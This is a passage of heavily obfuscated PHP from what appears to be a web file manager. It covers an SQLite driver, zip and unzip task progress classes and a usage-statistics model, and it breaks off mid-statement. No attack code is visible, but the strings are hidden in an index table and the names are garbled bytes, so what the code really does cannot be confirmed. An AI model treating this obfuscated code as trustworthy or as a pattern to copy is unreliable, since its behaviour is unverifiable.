execute($şú©ÔÃ») { $Í’í¯“º =& $_SERVER[³·—™¤¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $şú©ÔÃ»; if ($this->queryID) { $this->free(); } think_action_status($Í’í¯“º[25], 1); think_status($Í’í¯“º[24]); $ôÇÜØÆ½ = $this->_linkID->exec($şú©ÔÃ»); $this->debug(); if (!1 === $ôÇÜØÆ½) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[³·—™¤¢][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¾‚‡Ğö· = $this->_linkID->query($_SERVER[³·—™¤¢][27]); if (!$¾‚‡Ğö·) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $«­»ü´• = $this->_linkID->query($_SERVER[³·—™¤¢][28]); if (!$«­»ü´•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÚÜ—Ôîï = array(); while ($öç­Ïã = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÚÜ—Ôîï[] = $öç­Ïã; } $this->queryID->reset(); return $ÚÜ—Ôîï; } public function getFields($íğøÙŒ°) { $Ù›ÃÏ¡ê =& $_SERVER[³·—™¤¢]; $ëäÍ¨ë = $this->query($Ù›ÃÏ¡ê[29] . $íğøÙŒ° . $Ù›ÃÏ¡ê[30]); $ˆàÖ¯Ç¢ = array(); if ($ëäÍ¨ë) { foreach ($ëäÍ¨ë as $œƒ§¾ñ => $áÕğ°Ş¿) { $ˆàÖ¯Ç¢[$áÕğ°Ş¿[$Ù›ÃÏ¡ê[32]]] = array($Ù›ÃÏ¡ê[32] => $áÕğ°Ş¿[$Ù›ÃÏ¡ê[32]], $Ù›ÃÏ¡ê[33] => $áÕğ°Ş¿[$Ù›ÃÏ¡ê[33]], $Ù›ÃÏ¡ê[35] => (bool) ($áÕğ°Ş¿[$Ù›ÃÏ¡ê[35]] === $Ù›ÃÏ¡ê[12]), $Ù›ÃÏ¡ê[37] => $áÕğ°Ş¿[$Ù›ÃÏ¡ê[56]], $Ù›ÃÏ¡ê[39] => (bool) $áÕğ°Ş¿[$Ù›ÃÏ¡ê[57]], $Ù›ÃÏ¡ê[42] => (bool) $áÕğ°Ş¿[$Ù›ÃÏ¡ê[57]]); } } return $ˆàÖ¯Ç¢; } public function getTables($µËƒªÙ¾ = '') { $¤¦ò½»Õ =& $_SERVER[³·—™¤¢]; $ı‰õŠ–í = $this->query($¤¦ò½»Õ[45] . $¤¦ò½»Õ[46] . $¤¦ò½»Õ[47]); $ıÍâ§¬ = array(); foreach ($ı‰õŠ–í as $Á¾ë‡„ˆ => $³¥èÉ§) { $ıÍâ§¬[$Á¾ë‡„ˆ] = current($³¥èÉ§); } return $ıÍâ§¬; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ò‚é´†Ó =& $_SERVER[³·—™¤¢]; $this->error = $this->_linkID->lastErrorMsg(); if ($ò‚é´†Ó[12] != $this->queryStr) { $this->error .= LNG($ò‚é´†Ó[48]) . $this->queryStr; } think_trace($this->error, $ò‚é´†Ó[12], $ò‚é´†Ó[49]); return $this->error; } public function escapeString($ÃÍ„øÜÕ) { $íÖü˜´Á =& $_SERVER[³·—™¤¢]; if ($this->_linkID) { return $this->_linkID->escapeString($ÃÍ„øÜÕ); } return str_ireplace($íÖü˜´Á[58], $íÖü˜´Á[59], $ÃÍ„øÜÕ); } public function parseLimit($¶Ì˜ğ„ƒ) { $ãÁŒ‰¢ü =& $_SERVER[³·—™¤¢]; $äÌª®  = $ãÁŒ‰¢ü[12]; if (!empty($¶Ì˜ğ„ƒ)) { $¶Ì˜ğ„ƒ = explode($ãÁŒ‰¢ü[50], $¶Ì˜ğ„ƒ); if (count($¶Ì˜ğ„ƒ) > 1) { $äÌª®  .= $ãÁŒ‰¢ü[51] . $¶Ì˜ğ„ƒ[1] . $ãÁŒ‰¢ü[52] . $¶Ì˜ğ„ƒ[0] . $ãÁŒ‰¢ü[53]; } else { $äÌª®  .= $ãÁŒ‰¢ü[51] . $¶Ì˜ğ„ƒ[0] . $ãÁŒ‰¢ü[53]; } } return $äÌª® ; } } goto d÷…›ôŠƒË; AÙôñÁØèÆ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $±Ù¨œâå =& $_SERVER[³·—™¤¢]; parent::startAfter(); Hook::bind($±Ù¨œâå[1773], array($this, $±Ù¨œâå[1774])); Hook::bind($±Ù¨œâå[1217], array($this, $±Ù¨œâå[1775])); $¶£ì”Î› =& $this->task; $¶£ì”Î›[$±Ù¨œâå[1776]] = $±Ù¨œâå[1222]; if (!$¶£ì”Î›[$±Ù¨œâå[1577]]) { $¶£ì”Î›[$±Ù¨œâå[1577]] = LNG($±Ù¨œâå[1777]); } } protected function endAfter() { $ˆü¤ªğû =& $_SERVER[³·—™¤¢]; parent::endAfter(); Hook::unbind($ˆü¤ªğû[1773], array($this, $ˆü¤ªğû[1774])); Hook::unbind($ˆü¤ªğû[1217], array($this, $ˆü¤ªğû[1775])); } public function updateAfter() { $ƒ»ùïÈÑ =& $_SERVER[³·—™¤¢]; $Õ—›ô“‘ =& $this->task; if (!$Õ—›ô“‘[$ƒ»ùïÈÑ[806]] || !$Õ—›ô“‘[$ƒ»ùïÈÑ[783]]) { return; } if ($Õ—›ô“‘[$ƒ»ùïÈÑ[1776]] == $ƒ»ùïÈÑ[1222]) { $øÙÛ„‘Ÿ = 0; if ($Õ—›ô“‘[$ƒ»ùïÈÑ[1731]]) { $øÙÛ„‘Ÿ = $Õ—›ô“‘[$ƒ»ùïÈÑ[1732]] / $Õ—›ô“‘[$ƒ»ùïÈÑ[1731]]; } $Õ—›ô“‘[$ƒ»ùïÈÑ[1682]] = $øÙÛ„‘Ÿ * 0.3; } else { if ($Õ—›ô“‘[$ƒ»ùïÈÑ[1776]] == $ƒ»ùïÈÑ[313]) { $øÙÛ„‘Ÿ = $Õ—›ô“‘[$ƒ»ùïÈÑ[1681]] / $Õ—›ô“‘[$ƒ»ùïÈÑ[806]]; $Õ—›ô“‘[$ƒ»ùïÈÑ[1682]] = 0.3 + $øÙÛ„‘Ÿ * 0.4; } else { if ($Õ—›ô“‘[$ƒ»ùïÈÑ[1776]] == $ƒ»ùïÈÑ[107]) { $—ı§º…Ù = 0; if ($Õ—›ô“‘[$ƒ»ùïÈÑ[1733]] == $ƒ»ùïÈÑ[107]) { $—ı§º…Ù = $Õ—›ô“‘[$ƒ»ùïÈÑ[1732]]; } $øÙÛ„‘Ÿ = ($Õ—›ô“‘[$ƒ»ùïÈÑ[1736]] + $—ı§º…Ù) / $Õ—›ô“‘[$ƒ»ùïÈÑ[783]]; $Õ—›ô“‘[$ƒ»ùïÈÑ[1682]] = 0.3 + 0.4 + $øÙÛ„‘Ÿ * 0.3; } } } if ($Õ—›ô“‘[$ƒ»ùïÈÑ[1682]] > 0) { $ …Ø©ï‚ = timeFloat() - $Õ—›ô“‘[$ƒ»ùïÈÑ[1684]] - $Õ—›ô“‘[$ƒ»ùïÈÑ[1687]]; $Õ—›ô“‘[$ƒ»ùïÈÑ[1688]] = $ …Ø©ï‚ * (1 - $Õ—›ô“‘[$ƒ»ùïÈÑ[1682]]) / $Õ—›ô“‘[$ƒ»ùïÈÑ[1682]]; } } public function addFile($‘ì†“î) { $Œ¼©“ˆ =& $_SERVER[³·—™¤¢]; $Òºæù’ =& $this->task; $±•¯€…º = IO::info($‘ì†“î); $Òºæù’[$Œ¼©“ˆ[1729]] = $±•¯€…º[$Œ¼©“ˆ[32]]; $Òºæù’[$Œ¼©“ˆ[1731]] = $±•¯€…º[$Œ¼©“ˆ[76]]; $Òºæù’[$Œ¼©“ˆ[1732]] = 0; $Òºæù’[$Œ¼©“ˆ[1087]] = $Œ¼©“ˆ[1752]; $Òºæù’[$Œ¼©“ˆ[1733]] = $Œ¼©“ˆ[1222]; $Òºæù’[$Œ¼©“ˆ[783]] = $±•¯€…º[$Œ¼©“ˆ[76]]; $Òºæù’[$Œ¼©“ˆ[806]] = 1; $ãçÛ§ó÷ = 0; $Òºæù’[$Œ¼©“ˆ[1740]] = array($Œ¼©“ˆ[1741] => $ãçÛ§ó÷ + 1, $Œ¼©“ˆ[420] => $±•¯€…º[$Œ¼©“ˆ[32]], $Œ¼©“ˆ[84] => $±•¯€…º[$Œ¼©“ˆ[84]], $Œ¼©“ˆ[519] => $±•¯€…º[$Œ¼©“ˆ[519]] ? $±•¯€…º[$Œ¼©“ˆ[519]] : $±•¯€…º[$Œ¼©“ˆ[84]]); $this->update(); } public function unzipAfter($”¾À˜ğ) { $ëÀÍ =& $_SERVER[³·—™¤¢]; $ä´Üóê¢ =& $this->task; $ä´Üóê¢[$ëÀÍ[1776]] = $ëÀÍ[107]; $ø©½Ÿñî = IO::infoWithChildren($”¾À˜ğ); $çÕ•ÓÌè = 0; $ä´Üóê¢[$ëÀÍ[1740]] = array($ëÀÍ[1741] => $çÕ•ÓÌè + 1, $ëÀÍ[420] => $ø©½Ÿñî[$ëÀÍ[32]], $ëÀÍ[84] => $ø©½Ÿñî[$ëÀÍ[84]], $ëÀÍ[519] => $ø©½Ÿñî[$ëÀÍ[519]] ? $ø©½Ÿñî[$ëÀÍ[519]] : $ø©½Ÿñî[$ëÀÍ[84]]); if ($ø©½Ÿñî[$ëÀÍ[33]] == $ëÀÍ[199]) { $ä´Üóê¢[$ëÀÍ[806]] = 1; } else { $ä´Üóê¢[$ëÀÍ[806]] = $ø©½Ÿñî[$ëÀÍ[79]][$ëÀÍ[77]]; } $ä´Üóê¢[$ëÀÍ[1087]] = $ëÀÍ[12]; $ä´Üóê¢[$ëÀÍ[1733]] = 0; $ä´Üóê¢[$ëÀÍ[1681]] = 0; $ä´Üóê¢[$ëÀÍ[1731]] = 0; $ä´Üóê¢[$ëÀÍ[1732]] = 0; $ä´Üóê¢[$ëÀÍ[1729]] = $ëÀÍ[12]; $ä´Üóê¢[$ëÀÍ[1736]] = 0; $ä´Üóê¢[$ëÀÍ[783]] = $ø©½Ÿñî[$ëÀÍ[76]]; $this->update(); self::log($ëÀÍ[1778] . json_encode(array($ä´Üóê¢, $ø©½Ÿñî))); } public function nameParse($æä½üô¯) { $ãÏÖ×Ş¡ =& $_SERVER[³·—™¤¢]; $ÉïÅšè× =& $this->task; if ($ÉïÅšè×[$ãÏÖ×Ş¡[1776]] == $ãÏÖ×Ş¡[1222]) { $ÉïÅšè×[$ãÏÖ×Ş¡[1776]] = $ãÏÖ×Ş¡[313]; $ÉïÅšè×[$ãÏÖ×Ş¡[1736]] = 0; $ÉïÅšè×[$ãÏÖ×Ş¡[783]] = 0; } $·”×”ï¶ = get_path_this($æä½üô¯); if (strstr($·”×”ï¶, $ãÏÖ×Ş¡[10])) { $ÉïÅšè×[$ãÏÖ×Ş¡[1681]] += 1; $ÉïÅšè×[$ãÏÖ×Ş¡[806]] += 1; } $ÉïÅšè×[$ãÏÖ×Ş¡[1729]] = $æä½üô¯; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¦«îì¨Ÿ =& $_SERVER[³·—™¤¢]; parent::startAfter(); Hook::bind($¦«îì¨Ÿ[1779], array($this, $¦«îì¨Ÿ[1774])); $¨ÕêÁ™  =& $this->task; $¨ÕêÁ™ [$¦«îì¨Ÿ[1776]] = $¦«îì¨Ÿ[1222]; if (!$¨ÕêÁ™ [$¦«îì¨Ÿ[1577]]) { $¨ÕêÁ™ [$¦«îì¨Ÿ[1577]] = LNG($¦«îì¨Ÿ[1780]); } } protected function endAfter() { $áÚ›„ÀÑ =& $_SERVER[³·—™¤¢]; parent::endAfter(); Hook::unbind($áÚ›„ÀÑ[1779], array($this, $áÚ›„ÀÑ[1774])); } public function updateAfter() { $¦ÃÑ«å´ =& $_SERVER[³·—™¤¢]; $”ŸŒÙ¼Ú =& $this->task; if (!$”ŸŒÙ¼Ú[$¦ÃÑ«å´[806]] || !$”ŸŒÙ¼Ú[$¦ÃÑ«å´[783]]) { return; } if ($”ŸŒÙ¼Ú[$¦ÃÑ«å´[1776]] == $¦ÃÑ«å´[1222]) { $‚‚Òœ‚ı = $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1732]]; if ($”ŸŒÙ¼Ú[$¦ÃÑ«å´[1733]] != $¦ÃÑ«å´[1222]) { $‚‚Òœ‚ı = 0; } $°ÇÄ­ıÙ = ($”ŸŒÙ¼Ú[$¦ÃÑ«å´[1736]] + $‚‚Òœ‚ı) / $”ŸŒÙ¼Ú[$¦ÃÑ«å´[783]]; $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1682]] = $°ÇÄ­ıÙ * 0.3; } else { if ($”ŸŒÙ¼Ú[$¦ÃÑ«å´[1776]] == $¦ÃÑ«å´[313]) { $°ÇÄ­ıÙ = $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1681]] / $”ŸŒÙ¼Ú[$¦ÃÑ«å´[806]]; $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1682]] = 0.3 + $°ÇÄ­ıÙ * 0.5; } else { if ($”ŸŒÙ¼Ú[$¦ÃÑ«å´[1776]] == $¦ÃÑ«å´[107]) { $°ÇÄ­ıÙ = 0; if ($”ŸŒÙ¼Ú[$¦ÃÑ«å´[1731]]) { $°ÇÄ­ıÙ = $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1732]] / $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1731]]; } $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1682]] = 0.3 + 0.5 + $°ÇÄ­ıÙ * 0.2; } } } if ($”ŸŒÙ¼Ú[$¦ÃÑ«å´[1682]] > 0) { $ñ•‡á¡² = timeFloat() - $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1684]] - $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1687]]; $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1688]] = $ñ•‡á¡² * (1 - $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1682]]) / $”ŸŒÙ¼Ú[$¦ÃÑ«å´[1682]]; } } public function copyFileStart($Öåó…¾ä, $…²Êµº, $æó³“‹, $ÑûÏÆ×Ô, $Ë¨úÒ¦«, $ÆÚÑÅŒÔ) { $¸æÃïÔÖ =& $_SERVER[³·—™¤¢]; parent::copyFileStart($Öåó…¾ä, $…²Êµº, $æó³“‹, $ÑûÏÆ×Ô, $Ë¨úÒ¦«, $ÆÚÑÅŒÔ); $ŸêŸ´ =& $this->task; if ($ŸêŸ´[$¸æÃïÔÖ[1776]] == $¸æÃïÔÖ[313]) { $ŸêŸ´[$¸æÃïÔÖ[1776]] = $¸æÃïÔÖ[107]; } $this->update(); } public function copyFileEnd($ÇÉ‚¯ïÔ, $ï¹éİŞë, $Ğåí, $‰»ò†ÕÆ, $ˆ€ó×Åà, $ª±ñóŞğ) { $îùŸ±æ =& $_SERVER[³·—™¤¢]; $€æ‘úÉÉ =& $this->task; $€æ‘úÉÉ[$îùŸ±æ[1732]] = $€æ‘úÉÉ[$îùŸ±æ[1731]]; $€æ‘úÉÉ[$îùŸ±æ[1736]] += $€æ‘úÉÉ[$îùŸ±æ[1731]]; $€æ‘úÉÉ[$îùŸ±æ[1733]] = $îùŸ±æ[12]; $this->update(); } public function nameParse($¨…úÚÒ) { $Ù±Œ”Í² =& $_SERVER[³·—™¤¢]; $Ëêš ÜÚ =& $this->task; if ($Ëêš ÜÚ[$Ù±Œ”Í²[1681]] < $Ëêš ÜÚ[$Ù±Œ”Í²[806]]) { $Ë¾Ùà¬ = get_path_this($¨…úÚÒ); if (strstr($Ë¾Ùà¬, $Ù±Œ”Í²[10])) { $Ëêš ÜÚ[$Ù±Œ”Í²[1681]] += 1; } } if ($Ëêš ÜÚ[$Ù±Œ”Í²[1776]] == $Ù±Œ”Í²[1222]) { $Ëêš ÜÚ[$Ù±Œ”Í²[1776]] = $Ù±Œ”Í²[313]; } $Ëêš ÜÚ[$Ù±Œ”Í²[1729]] = $¨…úÚÒ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Åª­Øç) { $Ş–óô =& $_SERVER[³·—™¤¢]; $À´ğÁß = array($Ş–óô[600] => array($Ş–óô[33] => $Ş–óô[1781], $Ş–óô[273] => array($Ş–óô[224], $Ş–óô[785], $Ş–óô[1782], $Ş–óô[1783])), $Ş–óô[1784] => array($Ş–óô[33] => $Ş–óô[1785], $Ş–óô[273] => array($Ş–óô[224], $Ş–óô[783], $Ş–óô[1786], $Ş–óô[1787], $Ş–óô[1788]))); if (!isset($À´ğÁß[$Åª­Øç])) { return !1; } $this->optionType = $À´ğÁß[$Åª­Øç][$Ş–óô[33]]; $this->field = $À´ğÁß[$Åª­Øç][$Ş–óô[273]]; return !0; } public function listData($µš‚µ»¢ = false, $Â™Ä–ê = "\x6d\157\144\x69\x66\x79\124\151\155\x65", $…Í¥¿àø = false) { return parent::listData($µš‚µ»¢, $Â™Ä–ê, $…Í¥¿àø); } public function trendList($¸´¬»Û) { $È°ıŞùŠ =& $_SERVER[³·—™¤¢]; $ÒÃ©â‡Ú = $this->listData(); if ($ÒÃ©â‡Ú) { $Ë×Šåè¤ = end($ÒÃ©â‡Ú); $ „çìØô = date($È°ıŞùŠ[1789], strtotime($È°ıŞùŠ[1790])); if ($Ë×Šåè¤[$È°ıŞùŠ[224]] == $ „çìØô) { return $ÒÃ©â‡Ú; } $Å¥˜õ›ø = strtotime($Ë×Šåè¤[$È°ıŞùŠ[224]]); } if (!isset($Å¥˜õ›ø)) { $œ…ä‹ù” = $¸´¬»Û == $È°ıŞùŠ[600] ? $È°ıŞùŠ[535] : $È°ıŞùŠ[845]; $Å¥˜õ›ø = Model($œ…ä‹ù”)->min($È°ıŞùŠ[200]); } $àïÑÃèŒ = $È°ıŞùŠ[1791] . ucfirst($¸´¬»Û); $œá­¤†Ö = $this->dateList($Å¥˜õ›ø); foreach ($œá­¤†Ö as $ „çìØô) { $this->{$àïÑÃèŒ}($ „çìØô); } return $this->listData(); } private function dateList($’…í’€») { $Ï¸²İÂ  =& $_SERVER[³·—™¤¢]; $‹¶’¼÷Ÿ = $’…í’€»; $«ŒŠÁ¡Ë = strtotime($Ï¸²İÂ [1790]); $Ã³¯™Ì² = array(); while ($‹¶’¼÷Ÿ <= $«ŒŠÁ¡Ë) { $Ã³¯™Ì²[] = date($Ï¸²İÂ [1789], $‹¶’¼÷Ÿ); $‹¶’¼÷Ÿ = strtotime($Ï¸²İÂ [1792], $‹¶’¼÷Ÿ); } return $Ã³¯™Ì²; } public function _recordUser($©óÆ¶ì = '') { $´ûÖçò­ =& $_SERVER[³·—™¤¢]; $ø±ÎÍŒ = strtotime(date($´ûÖçò­[1793], strtotime($©óÆ¶ì))); $üÊà¿ = strtotime(date($´ûÖçò­[1794], strtotime($©óÆ¶ì))); $¶Â…‘Ú´ = array($´ûÖçò­[200] => array($´ûÖçò­[1036], $üÊà¿)); $ÌŒÂŸğÁ = Model($´ûÖçò­[535])->where($¶Â…‘Ú´)->count($´ûÖçò­[1680]); $¶Â…‘Ú´[$´ûÖçò­[200]] = array($´ûÖçò­[333], array($ø±ÎÍŒ, $üÊà¿)); $Ò°‚Í» = Model($´ûÖçò­[535])->where($¶Â…‘Ú´)->count($´ûÖçò­[1680]); $¶Â…‘Ú´[$´ûÖçò­[33]] = $´ûÖçò­[1795]; $İ€’·Ùô = Model($´ûÖçò­[1796])->where($¶Â…‘Ú´)->count($´ûÖçò­[1797]); $éÊàœú› = array($´ûÖçò­[224] => $©óÆ¶ì, $´ûÖçò­[785] => (int) $ÌŒÂŸğÁ, $´ûÖçò­[1782] => (int) $Ò°‚Í», $´ûÖçò­[1783] => (int) $İ€’·Ùô); return $this->insert($éÊàœú›); } public function _recordStore($³ï–Â¼´ = '') { $—åµˆŞö =& $_SERVER[³·—™¤¢]; $íÌº—íß = strtotime(date($—åµˆŞö[1794], strtotime($³ï–Â¼´))); $Å¡Äå¢å = array($—åµˆŞö[200] => array($—åµˆŞö[1036], $íÌº—íß)); $øÖœ‚–Ì = Model($—åµˆŞö[471])->where($Å¡Äå¢å)->sum($—åµˆŞö[76]); $Å¡Äå¢å[$—åµˆŞö[410]] = 0; $ô¦Ö„€ = Model($—åµˆŞö[845])->where($Å¡Äå¢å)->sum($—åµˆŞö[76]); $Å¡Äå¢å[$—åµˆŞö[411]] = 1; $ÑÌ¶‚Ç  = Model($—åµˆŞö[845])->where($Å¡Äå¢å)->sum($—åµˆŞö[76]); $Å¡Äå¢å[$—åµˆŞö[411]] = 2; $›´Ùï‚­ = Model($—åµˆŞö[845])->where($Å¡Äå¢å)->sum($—åµˆŞö[76]); $¿ïµ¬§¯ = array($—åµˆŞö[224] => $³ï–Â¼´, $—åµˆŞö[783] => (int) $ô¦Ö„€, $—åµˆŞö[1786] => (int) $øÖœ‚–Ì, $—åµˆŞö[1787] => (int) $ÑÌ¶‚Ç , $—åµˆŞö[1788] => (int) $›´Ùï‚­); return $this->insert($¿ïµ¬§¯); } public function trend($×¶‚ö, $“åÊ¥ó) { $€ÜªÀˆ =& $_SERVER[³·—™¤¢]; if (!$this->init($×¶‚ö)) { return !1; } $£§¦¸‹Õ = $this->trendList($×¶‚ö); if ($£§¦¸‹Õ && $“åÊ¥ó != $€ÜªÀˆ[1653]) { $Á§ùáÂƒ = $£§¦¸‹Õ[0][$€ÜªÀˆ[224]]; $õÆşÂ€” = $this->validDate($“åÊ¥ó, $Á§ùáÂƒ); $å…êé¦ú = array(); $Ë‚–¾“İ = array_to_keyvalue($£§¦¸‹Õ, $€ÜªÀˆ[224]); foreach ($õÆşÂ€” as $‡òŒıªÆ) { if (isset($Ë‚–¾“İ[$‡òŒıªÆ])) { $¨ëˆšóÎ = $Ë‚–¾“İ[$‡òŒıªÆ]; } else { $¨ëˆšóÎ = end($£§¦¸‹Õ); $¨ëˆšóÎ[$€ÜªÀˆ[224]] = $‡òŒıªÆ; if ($×¶‚ö == $€ÜªÀˆ[600]) { $¨ëˆšóÎ[$€ÜªÀˆ[1782]] = $¨ëˆšóÎ[$€ÜªÀˆ[1783]] = 0; } } $å…êé¦ú[] = $¨ëˆšóÎ; } $£§¦¸‹Õ = $å…êé¦ú; } $Œã³òû¨ = array($€ÜªÀˆ[600] => array($€ÜªÀˆ[785] => LNG($€ÜªÀˆ[1798]), $€ÜªÀˆ[1782] => LNG($€ÜªÀˆ[1799]), $€ÜªÀˆ[1783] => LNG($€ÜªÀˆ[1800])), $€ÜªÀˆ[1784] => array($€ÜªÀˆ[783] => LNG($€ÜªÀˆ[1801]), $€ÜªÀˆ[1786] => LNG($€ÜªÀˆ[1802]), $€ÜªÀˆ[1787] => LNG($€ÜªÀˆ[1803]), $€ÜªÀˆ[1788] => LNG($€ÜªÀˆ[1804]))); $îâìƒìÚ = array($€ÜªÀˆ[600] => $€ÜªÀˆ[1805], $€ÜªÀˆ[1784] => $€ÜªÀˆ[76]); if (empty($£§¦¸‹Õ)) { $‡òŒıªÆ = date($€ÜªÀˆ[1789], strtotime($€ÜªÀˆ[1790])); $â§Ñ˜ = array($€ÜªÀˆ[224] => $‡òŒıªÆ); foreach ($Œã³òû¨[$×¶‚ö] as $Šãªá«Å => $Ãú¸ş§Õ) { $â§Ñ˜[$Šãªá«Å] = 0; } $£§¦¸‹Õ[] = $â§Ñ˜; } $ÇÑØı‰ã = array(); foreach ($£§¦¸‹Õ as $Ãú¸ş§Õ) { if ($×¶‚ö == $€ÜªÀˆ[1784] && $Ãú¸ş§Õ[$€ÜªÀˆ[1786]] > $Ãú¸ş§Õ[$€ÜªÀˆ[783]]) { $Ãú¸ş§Õ[$€ÜªÀˆ[1786]] = $Ãú¸ş§Õ[$€ÜªÀˆ[783]]; } foreach ($Œã³òû¨[$×¶‚ö] as $Šãªá«Å => $ï½Ì×åµ) { $¨ëˆšóÎ = array($€ÜªÀˆ[224] => $Ãú¸ş§Õ[$€ÜªÀˆ[224]], $€ÜªÀˆ[1577] => $ï½Ì×åµ); $¨ëˆšóÎ[$îâìƒìÚ[$×¶‚ö]] = isset($Ãú¸ş§Õ[$Šãªá«Å]) ? $Ãú¸ş§Õ[$Šãªá«Å] : 0; $ÇÑØı‰ã[] = $¨ëˆšóÎ; } } return $ÇÑØı‰ã; } public function validDate($€ÑåÆâÔ, $ùŸ¤ëÖ–) { $ÀÄ¼ «Á =& $_SERVER[³·—™¤¢]; $°Ï§şìÚ = date($ÀÄ¼ «Á[1789], strtotime($ÀÄ¼ «Á[1790])); $ÕşË­¦Ã = array($°Ï§şìÚ); switch ($€ÑåÆâÔ) { case $ÀÄ¼ «Á[1660]: $ùÃÃ³¯À = mktime(0, 0, 0, date($ÀÄ¼ «Á[1806]), date($ÀÄ¼ «Á[1398]) - date($ÀÄ¼ «Á[1461]) + 7 - 7, date($ÀÄ¼ «Á[1807])); $½øöŞÙ´ = 0; do { $Õ‚´¹éü = date($ÀÄ¼ «Á[1789], $ùÃÃ³¯À - 3600 * 24 * 7 * $½øöŞÙ´); $ÕşË­¦Ã[] = $Õ‚´¹éü; $½øöŞÙ´++; } while ($ùŸ¤ëÖ– < $Õ‚´¹éü); break; case $ÀÄ¼ «Á[1658]: $½øöŞÙ´ = 1; do { $üÆé´É² = date($ÀÄ¼ «Á[1808], strtotime("\x2d\x20{$½øöŞÙ´}\x20\x6d\x6f\156\x74\x68\163")); $ÕşË­¦Ã[] = $üÆé´É²; $½øöŞÙ´++; } while ($ùŸ¤ëÖ– < $üÆé´É²); break; case $ÀÄ¼ «Á[1809]: $œÖ„šš¹ = (int) date($ÀÄ¼ «Á[1807], strtotime($ùŸ¤ëÖ–)); $¼¡ù©³ì = (int) date($ÀÄ¼ «Á[1807]); if ($œÖ„šš¹ >= $¼¡ù©³ì) { break; } for ($œÖ„šš¹; $œÖ„šš¹ < $¼¡ù©³ì; $œÖ„šš¹++) { $ÕşË­¦Ã[] = $œÖ„šš¹ . $ÀÄ¼ «Á[1810]; } break; default: break; } if ($ùŸ¤ëÖ– > end($ÕşË­¦Ã)) { array_pop($ÕşË­¦Ã); } sort($ÕşË­¦Ã); return $ÕşË­¦Ã; } public function listTable($¿ª˜—”’) { $ØöÅåğ = ucfirst($¿ª˜—”’); return Model($ØöÅåğ)->listData(); } public function option($ë²©èãÑ) { $¯ş«—Ğè = $_SERVER[³·—™¤¢][1811] . ucfirst($ë²©èãÑ); return $this->{$¯ş«—Ğè}(); } private function optionUser() { $×ó½ˆ€ß =& $_SERVER[³·—™¤¢]; $·•İÀãã = Model($×ó½ˆ€ß[535])->count($×ó½ˆ€ß[1680]); $È³§‡ÛÚ = Model($×ó½ˆ€ß[535])->where($×ó½ˆ€ß[1812])->count($×ó½ˆ€ß[1680]); $Šµß£ = intval($GLOBALS[$×ó½ˆ€ß[6]][$×ó½ˆ€ß[349]][$×ó½ˆ€ß[1635]]) / 3600; $ØÃ˜«¶„ = strtotime("\x2d{$Šµß£}\40\x68\x6f\165\162\163"); $ÉÙ·Ê”Æ = strtotime(date($×ó½ˆ€ß[1793])); if ($ØÃ˜«¶„ < $ÉÙ·Ê”Æ) { $ØÃ˜«¶„ = $ÉÙ·Ê”Æ; } $Âê¦²ı = array($×ó½ˆ€ß[1813] => array($×ó½ˆ€ß[1037], $ØÃ˜«¶„)); $ëƒ›ñÖ = (int) Model($×ó½ˆ€ß[535])->where($Âê¦²ı)->count($×ó½ˆ€ß[1680]); if (!$ëƒ›ñÖ) { $ëƒ›ñÖ = 1; } $Âê¦²ı = array($×ó½ˆ€ß[1813] => array($×ó½ˆ€ß[1037], $ÉÙ·Ê”Æ)); $ÔÏ¯ÇÍÚ = Model($×ó½ˆ€ß[535])->where($Âê¦²ı)->count($×ó½ˆ€ß[1680]); return array($×ó½ˆ€ß[779] => (int) $·•İÀãã, $×ó½ˆ€ß[1814] => (int) ($·•İÀãã - $È³§‡ÛÚ), $×ó½ˆ€ß[1815] => (int) $È³§‡ÛÚ, $×ó½ˆ€ß[1816] => (int) $ÔÏ¯ÇÍÚ, $×ó½ˆ€ß[1817] => $ëƒ›ñÖ); } private function optionFile() { $Ò¤ÃùÍ… =& $_SERVER[³·—™¤¢]; $Î‡ËÆÔ» = $this->sourceSize(); $æ·³±‚ = $Î‡ËÆÔ»[$Ò¤ÃùÍ…[76]]; $¦˜çÀ¨ = $Î‡ËÆÔ»[$Ò¤ÃùÍ…[1786]]; $È½•áÃ¸ = Model($Ò¤ÃùÍ…[845])->where(array($Ò¤ÃùÍ…[410] => 0))->count($Ò¤ÃùÍ…[402]); $ÛÀò‘‡ = array($Ò¤ÃùÍ…[410] => 0, $Ò¤ÃùÍ…[200] => array($Ò¤ÃùÍ…[1037], strtotime(date($Ò¤ÃùÍ…[1793])))); $³éüÆÍ§ = Model($Ò¤ÃùÍ…[845])->where($ÛÀò‘‡)->sum($Ò¤ÃùÍ…[76]); $á†ƒŠ® = Model($Ò¤ÃùÍ…[845])->where($ÛÀò‘‡)->count($Ò¤ÃùÍ…[402]); return array($Ò¤ÃùÍ…[783] => $æ·³±‚, $Ò¤ÃùÍ…[1786] => $¦˜çÀ¨, $Ò¤ÃùÍ…[1818] => $æ·³±‚ - $¦˜çÀ¨, $Ò¤ÃùÍ…[1819] => (int) $³éüÆÍ§, $Ò¤ÃùÍ…[785] => (int) $È½•áÃ¸, $Ò¤ÃùÍ…[1820] => (int) $á†ƒŠ®); } private function optionAccess() { $ÄÄ·§— =& $_SERVER[³·—™¤¢]; return array($ÄÄ·§—[779] => 